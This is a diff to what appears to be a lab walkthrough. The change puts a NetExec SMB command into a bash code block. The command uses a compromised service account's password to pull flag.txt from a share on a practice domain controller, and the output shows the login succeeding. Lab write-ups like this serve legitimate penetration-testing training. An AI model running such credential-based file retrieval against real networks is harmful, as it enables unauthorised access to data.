@@ -60,7 +60,11 @@ nxc smb 192.168.56.20 -u svc_sql -p 'Password1' --share KerberosFlag --dir
 
 ┌──(root㉿kali)-[~]
 
-└─# nxc smb 192.168.56.20 -u svc_sql -p 'Password1' --share KerberosFlag --get-file flag.txt flag.txt
+└─# 
+```bash
+nxc smb 192.168.56.20 -u svc_sql -p 'Password1' --share KerberosFlag --get-file flag.txt flag.txt
+```
+
 SMB          192.168.56.20   445    DC01             [*] Windows Server 2019 Datacenter Evaluation 17763 x64 (name:DC01) (domain:PENTESTLAB.local) (signing:True) (SMBv1:True) (Null Auth:True)
 SMB          192.168.56.20   445    DC01             [+] PENTESTLAB.local\svc_sql:Password1
 SMB          192.168.56.20   445    DC01             [*] Copying "flag.txt" to "flag.txt"
